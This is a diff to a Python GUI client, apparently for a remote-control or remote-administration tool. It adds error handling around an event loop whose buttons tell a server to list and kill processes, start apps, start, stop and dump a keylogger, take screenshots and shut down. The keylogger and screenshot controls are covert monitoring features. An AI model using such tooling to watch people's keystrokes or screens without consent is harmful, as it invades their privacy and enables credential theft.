@@ -47,55 +47,66 @@ def main():
   window = sg.Window("Remote Control", layout, no_titlebar=False, size=(720, 480))
 
   while True:
-    event, value = window.read()
-    
-    if event == "Exit" or event == sg.WIN_CLOSED:
-      client.end_connection()
-      break
+    try:
+      event, value = window.read()
+      if event == "Exit" or event == sg.WIN_CLOSED:
+        try:
+          client.end_connection()
+          break
+        except ConnectionResetError:
+          break
 
-    elif event == "View Processes":
-      window['OUTPUT'].Update('sekrjklsejlkser')
-      results = client.view_processes()
-      print(results)
-      window['OUTPUT'].update(value=results)
+      elif event == "View Processes":
+        window['OUTPUT'].Update('')
+        results = client.view_processes()
+        print(results)
+        window['OUTPUT'].update(value=results)
 
-    elif event == "View Apps":
-      window['OUTPUT'].Update('')
-      results = client.view_apps()
-      print(results)
-      window['OUTPUT'].update(value=results)
+      elif event == "View Apps":
+        window['OUTPUT'].Update('')
+        results = client.view_apps()
+        print(results)
+        window['OUTPUT'].update(value=results)
 
-    elif event == "Kill Process":
-      print(value[0])
-      client.kill_process(value[0])
+      elif event == "Kill Process":
+        msg = client.kill_process(value[0])
+        window['OUTPUT'].Update('')
+        window['OUTPUT'].update(value=msg)
 
-    elif event == "Start App":
-      print(value[1])
-      client.start_app(value[1])
+      elif event == "Start App":
+        msg = client.start_app(value[1])
+        window['OUTPUT'].update('')
+        window['OUTPUT'].update(value=msg)
 
-    elif event == "Start Key Logger":
-      window['OUTPUT'].Update('')
-      results = client.start_keylogger()
-      window['OUTPUT'].update(value=results)
+      elif event == "Start Key Logger":
+        window['OUTPUT'].Update('')
+        results = client.start_keylogger()
+        window['OUTPUT'].update(value=results)
 
-    elif event == "Stop Key Logger":
-      window['OUTPUT'].Update('')
-      results = client.stop_keylogger()
-      window['OUTPUT'].update(value=results)
+      elif event == "Stop Key Logger":
+        window['OUTPUT'].Update('')
+        results = client.stop_keylogger()
+        window['OUTPUT'].update(value=results)
 
-    elif event == "Print Key Logger":
-      window['OUTPUT'].Update('')
-      results = client.print_keylogger()
-      window['OUTPUT'].update(value=results)
+      elif event == "Print Key Logger":
+        window['OUTPUT'].Update('')
+        results = client.print_keylogger()
+        window['OUTPUT'].update(value=results)
 
-    elif event == "Take Screenshot":
-      client.take_screenshot()
-      client.save_file(TMP_PATH, 'screenshot.png')
+      elif event == "Take Screenshot":
+        client.take_screenshot()
+        client.save_file(TMP_PATH, 'screenshot.png')
 
-    elif event == "Shutdown":
-      window['OUTPUT'].Update('')
-      results = client.shutdown()
-      window['OUTPUT'].update(value=results)
+      elif event == "Shutdown":
+        window['OUTPUT'].Update('')
+        results = client.shutdown()
+        window['OUTPUT'].update(value=results)
+
+    except ConnectionResetError:
+      window['OUTPUT'].update(value="Server disconnected")
+    except Exception as e:
+      window['OUTPUT'].update(value="Error")
+
 
   window.close()
 
